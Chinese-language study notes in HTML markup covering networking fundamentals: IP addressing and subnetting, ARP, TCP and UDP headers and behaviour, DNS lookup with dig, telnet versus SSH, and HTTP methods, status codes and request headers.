&lt;p&gt;TCP 80 代表HTTP&lt;&#x2F;p&gt;
&lt;p&gt;TCP 443 代表HTTPS&lt;&#x2F;p&gt;
&lt;p&gt;UDP 4000&#x2F;8000 代表QQ&lt;&#x2F;p&gt;
&lt;p&gt;UDP 67&#x2F;68 代表DHCP服务&lt;&#x2F;p&gt;
&lt;p&gt;私有IP地址&lt;&#x2F;p&gt;
&lt;p&gt;保留&#x2F;特殊IP地址：&lt;&#x2F;p&gt;
&lt;p&gt;环回测试地址：127.0.0.1&lt;&#x2F;p&gt;
&lt;p&gt;全网广播地址：255.255.255.255&lt;&#x2F;p&gt;
&lt;p&gt;全网地址：0.0.0.0&lt;&#x2F;p&gt;
&lt;p&gt;自动配置IP地址：169.254.x.x&lt;&#x2F;p&gt;
&lt;p&gt;公有IP地址：从0.0.0.0-255.255.255.255这个范围内，去掉私有IP地址和特殊IP地址，剩下的就是公网IP地址&lt;&#x2F;p&gt;
&lt;p&gt;在公网里面，是不可能出现私网IP地址的&lt;&#x2F;p&gt;
&lt;p&gt;技术分类：&lt;&#x2F;p&gt;
&lt;p&gt;A：1.0.0.0-126.255.255.255&lt;&#x2F;p&gt;
&lt;p&gt;B：128.0.0.0-191.255.255.255&lt;&#x2F;p&gt;
&lt;p&gt;C：192.0.0.0-223.255.255.255&lt;&#x2F;p&gt;
&lt;p&gt;D：224.0.0.0-239.255.255.255    组播&lt;&#x2F;p&gt;
&lt;p&gt;E：240.0.0.0-255.255.255.255     科研&lt;&#x2F;p&gt;
&lt;p&gt;子网划分的目的&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;减小局域网范围&lt;&#x2F;li&gt;
&lt;li&gt;节省局域网的IP地址&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;子网划分：通过借用主机位来创造新的网络&lt;&#x2F;p&gt;
&lt;p&gt;子网划分步骤：&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;先看需要划分的IP地址属于哪一个大类（A\B\C），这个大类默认的子网掩码是多少&lt;&#x2F;li&gt;
&lt;li&gt;根据需求或者题目给的要求，先看需要借用几个主机位（比如说借用两个主机位，就可以划分2²个子网）&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;ARP协议&lt;&#x2F;p&gt;
&lt;p&gt;在局域网通信中，如果通信前没有对方的MAC地址，那么先通过ARP协议去请求对方的MAC，请求到的MAC地址条目，电脑会保存在ARP缓存表里面，查看命令是arp -a 当ARP缓存表里面有了对方的MAC，接下来通信的时候，就可以封装产生数据包了&lt;&#x2F;p&gt;
&lt;p&gt;清空ARP的命令是arp -d&lt;&#x2F;p&gt;
&lt;p&gt;在二层的以太网头部中，有一个type说明上层使用的协议类型&lt;&#x2F;p&gt;
&lt;p&gt;ARP请求包是一个广播包，ARP回复包是个单播包&lt;&#x2F;p&gt;
&lt;p&gt;ARP过程分为请求和回复：&lt;&#x2F;p&gt;
&lt;p&gt;请求包特点（Request）&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;因为不知道对方的MAC地址，所以请求包在封装的时候，二层以太网目的地址使用的是广播地址，全F&lt;&#x2F;li&gt;
&lt;li&gt;在ARP头部中，有四个重要的字段，其中，目标的MAC地址地段为空（48个零）&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;回复包特点（Replay）&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;二层以太网头部中，源目MAC地址都是唯一的&lt;&#x2F;li&gt;
&lt;li&gt;ARP头部中的源MAC地址就是要ARP请求包要请求的内容&lt;&#x2F;li&gt;
&lt;li&gt;当收到ARP回复包之后，电脑会读取ARP回复包里面的源MAC地址这个字段，记录在自己的ARP缓存表中&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;IP协议&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;PC1封装产生ping包   |smac  dmac|sip  dip|icmp|          （如果PC1没有网关路由器的MAC地址的话，需要先通过ARP进行获取）&lt;&#x2F;li&gt;
&lt;li&gt;产生ping包之后，通过网线传给交换机。交换机收到之后，查看二层头部里面的目的MAC地址，查找转发表，根据对应的条目进行转发（当交换机第一次收到数据包之后，会记录下来，我从这个接口收到的数据包的源mac地址，端口 -mac地址的映射）&lt;&#x2F;li&gt;
&lt;li&gt;路由器收到之后，读取ip头部里面的目的ip地址，然后查找路由表进行转发（一般情况下，路由器在自己的路由表中会自动生成直连路由，路由ip地址和端口的映射），正常情况下，路由器R1没有去往192.168.2.1的路由，所以数据包会被丢弃。如果要路由器正常转发数据包的话，那就需要通过静态路由技术或者路由协议生成路由表。&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;IP报头的大小：20-60字节&lt;&#x2F;p&gt;
&lt;p&gt;版本：标识ip协议的版本&lt;&#x2F;p&gt;
&lt;p&gt;首部长度：20-60字节&lt;&#x2F;p&gt;
&lt;p&gt;服务类型（tos）：用于服务质量（一般用于Qos技术）&lt;&#x2F;p&gt;
&lt;p&gt;总长度：ip头加上上层数据的数据包大小，最大为65536字节&lt;&#x2F;p&gt;
&lt;p&gt;标识（ID）：实现分片&lt;&#x2F;p&gt;
&lt;p&gt;标志flag：用来确认是否还有分片或者能否分片&lt;&#x2F;p&gt;
&lt;p&gt;分片偏移：按照一定的顺序正确重组数据包&lt;&#x2F;p&gt;
&lt;p&gt;生存时间（TTL）：标识数据包还能生存多长时间，路由器默认值是255，在不同的操作系统下面，TTL值一般也是不同的。当TTL值为零的时候，数据包会被丢弃&lt;&#x2F;p&gt;
&lt;p&gt;协议（protocol）：标识上层使用的是什么协议（tcp-6   udp-17   icmp-1）&lt;&#x2F;p&gt;
&lt;p&gt;头部校验和：保证数据包的完整性&lt;&#x2F;p&gt;
&lt;p&gt;ping 的时候指定数据包大小，用-l这个参数&lt;&#x2F;p&gt;
&lt;p&gt;数据包在传递的过程中，IP头部中的源目IP地址不会变化。TTL值会变（每经过一次转发就减一）&lt;&#x2F;p&gt;
&lt;p&gt;头部校验和会变&lt;&#x2F;p&gt;
&lt;p&gt;在二层以太网头部中，源目MAC地址都会变，头部校验也会变。&lt;&#x2F;p&gt;
&lt;p&gt;TCP功能：&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;面向连接：通过三次握手建立连接和四次挥手断开连接&lt;&#x2F;li&gt;
&lt;li&gt;可靠传输：通过序列号、确认号以及重传机制来保证可靠传输&lt;&#x2F;li&gt;
&lt;li&gt;流量控制：通过window字段来实现流量控制&lt;&#x2F;li&gt;
&lt;li&gt;多路复用：通过套接字来实现（IP+端口）&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;%E9%80%9A%E4%BF%A1%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80&#x2F;image-20200729101205255.png&quot; alt=&quot;image-20200729101205255&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;TCP报头：&lt;&#x2F;p&gt;
&lt;p&gt;源端口：用来标识这个数据包由哪一个应用程序或者服务发送的&lt;&#x2F;p&gt;
&lt;p&gt;目的端口：用来标识这个数据包由哪一个应用程序或者服务接手&lt;&#x2F;p&gt;
&lt;p&gt;序列号：在TCP连接中传递数据时，都会给数据的每一个字节编号，序列号字段的值指的就是本报文所发送的数据的第一个字节的序号&lt;&#x2F;p&gt;
&lt;p&gt;确认号：是期望收到对方的下一个报文段的数据的第一个字节的序号。这个字段只有当ACK标识置位的时候有效&lt;&#x2F;p&gt;
&lt;p&gt;头长度：20-60&lt;&#x2F;p&gt;
&lt;p&gt;保留位：没有使用&lt;&#x2F;p&gt;
&lt;p&gt;标记位：&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;URG 紧急指针，如果置位代表报文有紧急数据，要尽快传输&lt;&#x2F;li&gt;
&lt;li&gt;ACK  确认指针，如果置位代表此报文为确认包&lt;&#x2F;li&gt;
&lt;li&gt;PSH  推送指针，如果置位，数据包应该尽快交付给应用程序&lt;&#x2F;li&gt;
&lt;li&gt;RST  重置指针，如果置位，必须释放连接，并重新建立连接&lt;&#x2F;li&gt;
&lt;li&gt;SYN  同步指针，用来创建会话&lt;&#x2F;li&gt;
&lt;li&gt;FIN   结束指针，用来断开会话&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;滑动窗口：实现TCP的流量控制&lt;&#x2F;p&gt;
&lt;p&gt;校验和：确保数据包的完整性&lt;&#x2F;p&gt;
&lt;p&gt;紧急：只有当URG指针置位的时候有效，支持在本报文段有多少字节紧急数据&lt;&#x2F;p&gt;
&lt;p&gt;可选项：&lt;&#x2F;p&gt;
&lt;p&gt;功能详解：&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;面向连接：&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;三次握手：&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;%E9%80%9A%E4%BF%A1%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80&#x2F;image-20200729101414785.png&quot; alt=&quot;image-20200729101414785&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;四次挥手：&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;%E9%80%9A%E4%BF%A1%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80&#x2F;image-20200729102053001.png&quot; alt=&quot;image-20200729102053001&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;%E9%80%9A%E4%BF%A1%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80&#x2F;image-20200729102811515.png&quot; alt=&quot;image-20200729102811515&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;可靠传输&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;重传机制分为超时重传和快速重传&lt;&#x2F;p&gt;
&lt;p&gt;超时重传：&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;%E9%80%9A%E4%BF%A1%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80&#x2F;image-20200729103954044.png&quot; alt=&quot;image-20200729103954044&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;当客户端的请求包发出去的时候会开启一个计时器，当计时器到达时间之后，没有收到对方的ACK就会进行重传操作。直到达到重传次数限制或者收到对方回复的ACK&lt;&#x2F;p&gt;
&lt;p&gt;快速重传：&lt;&#x2F;p&gt;
&lt;p&gt;l&lt;img src=&quot;images&#x2F;%E9%80%9A%E4%BF%A1%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80&#x2F;image-20200729104420312.png&quot; alt=&quot;image-20200729104420312&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;快速重传指的是当接收方收到的数据包不是正常的序列号，那么接收方就会ACK一次期望的序号，来提醒对方重传。当发送方连续收到连续3条同一个序列号的ACK，他就意识到这个包丢了，从而立即重传。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;%E9%80%9A%E4%BF%A1%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80&#x2F;image-20200729105029906.png&quot; alt=&quot;image-20200729105029906&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;ol start=&quot;3&quot;&gt;
&lt;li&gt;流量控制&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;通过报头中的window字段进行控制，实时的。&lt;&#x2F;p&gt;
&lt;p&gt;通信过程中，双方会通过window这个字段告诉对方，当前可以接收的数据的大小。&lt;&#x2F;p&gt;
&lt;ol start=&quot;5&quot;&gt;
&lt;li&gt;多路复用&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;套接字：IP+port&lt;&#x2F;p&gt;
&lt;p&gt;web服务器：&lt;&#x2F;p&gt;
&lt;p&gt;公网ip地址12.12.12.12，开放web服务（nginx)，数据库服务，SSH服&lt;&#x2F;p&gt;
&lt;p&gt;UDP协议&lt;&#x2F;p&gt;
&lt;p&gt;特点：&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;UDP是无连接的，在时间上不存在建立连接所需要的时延，因为TCP需要连接，连接需要维护，所以在带宽开销方面UDP比TCP开销小。&lt;&#x2F;li&gt;
&lt;li&gt;包大小只有8个字节，TCP包最小20字节&lt;&#x2F;li&gt;
&lt;li&gt;UDP没有拥塞控制，适合某些对延迟有要求的应用&lt;&#x2F;li&gt;
&lt;li&gt;UDP不保证可靠交付，如果出现丢包，无错误返回信息&lt;&#x2F;li&gt;
&lt;li&gt;UDP是面向报文的，不会对应用层产生的数据进行合并或者分片，而是直接传送&lt;&#x2F;li&gt;
&lt;li&gt;UDP一般常用于一次性传输比较少量数据的网络应用&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;封装：&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;%E9%80%9A%E4%BF%A1%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80&#x2F;image-20200729144830617.png&quot; alt=&quot;image-20200729144830617&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;常见 的基于UDP 的服务或者应用：
DNS（53）    DHCP（67、68）     QQ（4000、8000）&lt;&#x2F;p&gt;
&lt;p&gt;常见的基于TCP的服务或应用：&lt;&#x2F;p&gt;
&lt;p&gt;Telnet(23)&lt;&#x2F;p&gt;
&lt;p&gt;HTTP(80)&lt;&#x2F;p&gt;
&lt;p&gt;https(443)&lt;&#x2F;p&gt;
&lt;p&gt;ftp(20 21)&lt;&#x2F;p&gt;
&lt;p&gt;微软的远程桌面（3389）&lt;&#x2F;p&gt;
&lt;p&gt;445端口   net file system，可以实现局域网文件共享或者局域网打印机共享&lt;&#x2F;p&gt;
&lt;p&gt;DNS协议：&lt;&#x2F;p&gt;
&lt;p&gt;域名系统&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;%E9%80%9A%E4%BF%A1%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80&#x2F;image-20200729150559841.png&quot; alt=&quot;image-20200729150559841&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;假设客户端要访问example.microsoft.com，具体的DNS过程：&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;先检查自身的DNS缓存，如果没有再检查hosts文件，如果还没有，就向本地域名服务器发出DNS解析请求&lt;&#x2F;li&gt;
&lt;li&gt;本地域名服务器收到查询请求之后，先检查缓存，如果查到请求的地址或者名字，即向客户端发出应答；如果没有查到，则在数据库中查找，若查到请求的地址或名字，即向客户端进行应答，如果在数据库中也没有查到，就向根域名服务器进行查找，如果根域名服务器没有找到则会让本地域名服务器去com顶级域名服务器查找&lt;&#x2F;li&gt;
&lt;li&gt;本地域名服务器向com顶级域名服务器发送查找请求，如果com顶级域名服务器没有查找到则会让本地域名服务器microsoft.com此二级域名服务器查找&lt;&#x2F;li&gt;
&lt;li&gt;如果二级域名服务器也没有查找到，则会去权威名称服务器查找&lt;&#x2F;li&gt;
&lt;li&gt;权威域名服务器收到请求之后，从name.conf中查找关于主机的记录然后返回给本地域名服务器IP地址&lt;&#x2F;li&gt;
&lt;li&gt;本地域名服务器收到回应之后在缓存中记录下来，然后再回复客户端&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;dig命令和nslookup命令进行查询&lt;&#x2F;p&gt;
&lt;p&gt;dig math.stackexchange.com&lt;&#x2F;p&gt;
&lt;p&gt;dig命令会显示出6部分内容：&lt;&#x2F;p&gt;
&lt;p&gt;第一部分是查询的参数和统计：&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;%E9%80%9A%E4%BF%A1%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80&#x2F;image-20200729153558048.png&quot; alt=&quot;image-20200729153558048&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;第二部分是查询内容：&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;%E9%80%9A%E4%BF%A1%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80&#x2F;image-20200729153659721.png&quot; alt=&quot;image-20200729153659721&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;第三部分是DNS服务器的应答&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;%E9%80%9A%E4%BF%A1%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80&#x2F;image-20200729153745169.png&quot; alt=&quot;image-20200729153745169&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;第四部分是NS记录，用来说明哪些服务器上保存了该域名的记录：&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;%E9%80%9A%E4%BF%A1%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80&#x2F;image-20200729153048884.png&quot; alt=&quot;image-20200729153048884&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;第五部分是上面四个NS服务器的IP地址，是随着上一段一起返回的&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;%E9%80%9A%E4%BF%A1%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80&#x2F;image-20200729153937837.png&quot; alt=&quot;image-20200729153937837&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;第六部分是DNS服务器的传输信息：&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;%E9%80%9A%E4%BF%A1%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80&#x2F;image-20200729154100098.png&quot; alt=&quot;image-20200729154100098&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;域名的层级：DNS服务器怎么知道每个域名对应的IP地址的呢？原因就是分级查询。通过上图的查询内容这张图，可以看到查询的域名尾部有一个点 “.”  ，这个点代表根域名&lt;&#x2F;p&gt;
&lt;p&gt;www.example.com真正的域名是www.example.com.root，简写为www.example.com  因为根域名.root对于所有的域名都是一样的，所以平时是省略的。&lt;&#x2F;p&gt;
&lt;p&gt;根域名的下一级是顶级域名，比如常见的.com .net .cn ；再下一级叫做次级域名或者二级域名，比如：example.com；二级域名用户是可以注册的。再下一级是主机名（host）www被称为三级域名&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;%E9%80%9A%E4%BF%A1%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80&#x2F;image-20200729155049289.png&quot; alt=&quot;image-20200729155049289&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;主机名.次级域名.顶级域名.根域名&lt;&#x2F;p&gt;
&lt;p&gt;host   .    sld      .    tld       .  root&lt;&#x2F;p&gt;
&lt;p&gt;DHCP&lt;&#x2F;p&gt;
&lt;p&gt;配置IP地址的方式：静态配置、自动获取&lt;&#x2F;p&gt;
&lt;p&gt;静态配置IP地址缺点：不方便管理，容易出错&lt;&#x2F;p&gt;
&lt;p&gt;动态配置IP：DHCP动态主机配置协议&lt;&#x2F;p&gt;
&lt;p&gt;telnet过程：&lt;&#x2F;p&gt;
&lt;p&gt;telnet是一个C&#x2F;S的服务模型。在使用telnet的时候，我们启动了两个程序：一个是telnet的客户程序，运行在我们的本地主机上；另一个是telnet的服务器程序，它运行在你要远程登录的服务器上。&lt;&#x2F;p&gt;
&lt;p&gt;本地telnet客户程序主要完成以下功能：&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;建立与服务器通信的tcp连接&lt;&#x2F;li&gt;
&lt;li&gt;接收本地输入的字符&lt;&#x2F;li&gt;
&lt;li&gt;将输入的字符串变成标准的格式并传送给服务端&lt;&#x2F;li&gt;
&lt;li&gt;从服务端接收信息&lt;&#x2F;li&gt;
&lt;li&gt;将接收的信息显示在本地屏幕上&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;远程服务端（精灵）功能：&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;通知客户端，服务端已经做好通信准备&lt;&#x2F;li&gt;
&lt;li&gt;等候客户端输入&lt;&#x2F;li&gt;
&lt;li&gt;对客户端的命令做出反应（查看文件、显示目录、执行程序）&lt;&#x2F;li&gt;
&lt;li&gt;将执行命令的结果返回给客户端&lt;&#x2F;li&gt;
&lt;li&gt;重新等候客户端的命令&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;telnet的安全性&lt;&#x2F;p&gt;
&lt;p&gt;数据都是明文传送的非常不安全，所以如果有远程登录需求，一般采用SSH来实现。&lt;&#x2F;p&gt;
&lt;p&gt;SSH服务（安全外壳程序secure Shell）&lt;&#x2F;p&gt;
&lt;p&gt;使用SSH可以有效的防止远程登录过程中的信息泄露问题&lt;&#x2F;p&gt;
&lt;p&gt;SSH可以有效防止“中间人攻击”，而且也能防止DNS欺骗和IP欺骗&lt;&#x2F;p&gt;
&lt;p&gt;SSH在传输数据的时候，数据是经过压缩的，可以提高传输速度&lt;&#x2F;p&gt;
&lt;p&gt;SSH验证&lt;&#x2F;p&gt;
&lt;p&gt;SSH也属于C&#x2F;S模型。从客户端来看，SSH提供了两张级别的安全验证&lt;&#x2F;p&gt;
&lt;p&gt;基于口令的安全验证&lt;&#x2F;p&gt;
&lt;p&gt;只有知道了账号和密码，就可以远程登录的服务器。可能会有其他服务器冒充真正的服务器，会受到“中间人攻击”&lt;&#x2F;p&gt;
&lt;p&gt;基于密钥的安全验证&lt;&#x2F;p&gt;
&lt;p&gt;需要依靠密钥，也就是说必须创建一对密钥。（非对称加密）&lt;&#x2F;p&gt;
&lt;p&gt;这一对密钥一把是公钥（所有人都可以知道），和一把私钥（只有本客户端知道）客户端会把公钥上传给服务器，服务器会保存在服务器本地。通信的时候，客户端连接到服务器，客户端软件就会向服务器发出请求，请求使用密钥进行安全验证。服务器本地收到请求后，现在服务器本地寻找公钥，然后和客户端发送过来的公钥进行对比，如果一致的话，服务器使用这把公钥加密“质询”，并把它发送给客户端软件，客户端收到后使用私钥解密再把它发送给服务器&lt;&#x2F;p&gt;
&lt;p&gt;HTTP协议（超文本传输协议）   1960年  泰德尼尔森&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;%E9%80%9A%E4%BF%A1%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80&#x2F;image-20200730101828065.png&quot; alt=&quot;image-20200730101828065&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;HTTP版本：&lt;&#x2F;p&gt;
&lt;p&gt;常见的有0.9 1.0 1.1 2.0，目前主流的版本是1.1，支持多种文件类型&lt;&#x2F;p&gt;
&lt;p&gt;HTTP 0.9 ：1991年，第一个正式使用的HTTP协议。支持get方法和HTML文本传输&lt;&#x2F;p&gt;
&lt;p&gt;HTTP 1.0 ：1996年，支持富文本，支持get&#x2F;post&#x2F;put&#x2F;head四种请求方式&lt;&#x2F;p&gt;
&lt;p&gt;HTTP 1.1 ：1999年，支持get&#x2F;post&#x2F;put&#x2F;head&#x2F;delete&#x2F;trace&#x2F;connect&#x2F;options请求方法&lt;&#x2F;p&gt;
&lt;p&gt;HTTP 2.0 ：2015年正式发布&lt;&#x2F;p&gt;
&lt;p&gt;2.0版本特点：&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;多路复用&lt;&#x2F;li&gt;
&lt;li&gt;二进制格式&lt;&#x2F;li&gt;
&lt;li&gt;服务端推送&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;%E9%80%9A%E4%BF%A1%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80&#x2F;image-20200730172624217.png&quot; alt=&quot;image-20200730172624217&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;%E9%80%9A%E4%BF%A1%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80&#x2F;image-20200730172638850.png&quot; alt=&quot;image-20200730172638850&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;HTTP请求和响应&lt;&#x2F;p&gt;
&lt;p&gt;http请求&lt;&#x2F;p&gt;
&lt;p&gt;请求方法：&lt;&#x2F;p&gt;
&lt;p&gt;Get方法：用于请求指定页面信息，一般的浏览网页就采用get方法，请求访问的内容一般会显示在浏览器的地址栏中&lt;&#x2F;p&gt;
&lt;p&gt;POST方法：用于请求并提交内容到指定页面，提交表单、上传文件变身采用post方法。提交的内容不会显示在浏览器地址栏，相对get来说更加安全，用户登录一般使用的都是post方法。&lt;&#x2F;p&gt;
&lt;p&gt;Head方法：跟get类似，只不过返回的响应中没有具体的内容，一般用于捕获报头。扫描器做内容探测的时候经常会有head方法，速度最快也不易被发现&lt;&#x2F;p&gt;
&lt;p&gt;Put方法：从客户端向服务器传送数据取代指定的内容。此方法容易被黑客利用，所以建议服务器关闭此方法&lt;&#x2F;p&gt;
&lt;p&gt;Delete方法：请求服务器删除指定的页面。此方法容易被黑客利用，所以建议服务器关闭此方法&lt;&#x2F;p&gt;
&lt;p&gt;Connect方法：1.1版本中预留给能够将连接改为管道方式的代理服务器&lt;&#x2F;p&gt;
&lt;p&gt;Options方法：容许客户端来查看服务器的性能&lt;&#x2F;p&gt;
&lt;p&gt;Trace方法：回显服务器收到的请求，一般用于测试或者诊断&lt;&#x2F;p&gt;
&lt;p&gt;响应状态码：&lt;&#x2F;p&gt;
&lt;p&gt;1XX  正在处理，范围100-101&lt;&#x2F;p&gt;
&lt;p&gt;2XX 成功处理，范围200-206&lt;&#x2F;p&gt;
&lt;p&gt;3XX 重定向，范围300-307&lt;&#x2F;p&gt;
&lt;p&gt;4XX客户端错误，范围400-417&lt;&#x2F;p&gt;
&lt;p&gt;5XX服务器错误，范围500-505&lt;&#x2F;p&gt;
&lt;p&gt;常见状态码：&lt;&#x2F;p&gt;
&lt;p&gt;200 请求成功&lt;&#x2F;p&gt;
&lt;p&gt;302 资源被临时转移到其他的URL，需要重定向访问&lt;&#x2F;p&gt;
&lt;p&gt;404 客户端请求错误或请求的资源不存在，服务器没法处理&lt;&#x2F;p&gt;
&lt;p&gt;500 服务器内部错误，无法提供服务&lt;&#x2F;p&gt;
&lt;p&gt;503 服务器暂时无法提供服务，需要等待一段时间&lt;&#x2F;p&gt;
&lt;p&gt;502 错误网关&lt;&#x2F;p&gt;
&lt;p&gt;请求字段：&lt;&#x2F;p&gt;
&lt;p&gt;用于客户端将附加信息告知服务端&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Host&lt;&#x2F;strong&gt;：标识请求的主机和端口&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Uaer-agent&lt;&#x2F;strong&gt;：用于将用客户端的操作系统和浏览器的信息告知服务器。服务端可以根据这个字段，判断并统计终端用户的类型。很多的安全软件可以伪造这个字段来欺骗服务器&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Referer&lt;&#x2F;strong&gt;：标识从哪一个连接跳转到此页面，包含一个URL。&lt;&#x2F;p&gt;
&lt;p&gt;Origin：与Referer类似，也是用来标识从哪个网站跳转过来的。Referer可以存在于各种请求，而Origin只存在于post请求中。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;cookie&lt;&#x2F;strong&gt;：用于记录客户端的身份信息，例如通过cookie可以登录网站。HTTP是无状态的，所以引入cookie支持会话管理。&lt;&#x2F;p&gt;
&lt;p&gt;​				Cookie: MARK-MANGE-GUIDE=true; online-uuid=30BCA95C-xx27-9280-xxA4-5704xxx41588xx;&lt;&#x2F;p&gt;
&lt;p&gt;Range：用于实现分块请求，比如一个比较大的文件，通过range来实现多线程下载&lt;&#x2F;p&gt;
&lt;p&gt;x-forward：表示客户端的IP地址。一般称为XXF头。服务器可以通过这个头部知道客户端的真实或者代理IP。攻击者也可以通过这个头部，伪造源IP地址，欺骗服务器。&lt;&#x2F;p&gt;
&lt;p&gt;Accept：表示客户端能够接收哪些文件类型（MIME）&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;%E9%80%9A%E4%BF%A1%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80&#x2F;image-20200730172955607.png&quot; alt=&quot;image-20200730172955607&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Accept-charset：表示客户端能够接收的字符集 utf-8&lt;&#x2F;p&gt;
&lt;p&gt;Authorization：web认证信息&lt;&#x2F;p&gt;
&lt;p&gt;Expect：期待服务器特定行为&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;From&lt;&#x2F;strong&gt;：用户的电子邮箱&lt;&#x2F;p&gt;
&lt;p&gt;if-match：比较实体标记&lt;&#x2F;p&gt;
&lt;p&gt;if-modified-since：比较资源的更新时间&lt;&#x2F;p&gt;
&lt;p&gt;if-range：资源未更新时发送实体字节范围请求&lt;&#x2F;p&gt;
&lt;p&gt;Max-forward：最大传输的跳数&lt;&#x2F;p&gt;
&lt;p&gt;DNT：do not track，chrome浏览器提供的安全功能，用于解决流量追踪问题&lt;&#x2F;p&gt;
&lt;p&gt;Upgrade-insecure-Request：Chrome提出的安全功能，升级非安全请求&lt;&#x2F;p&gt;
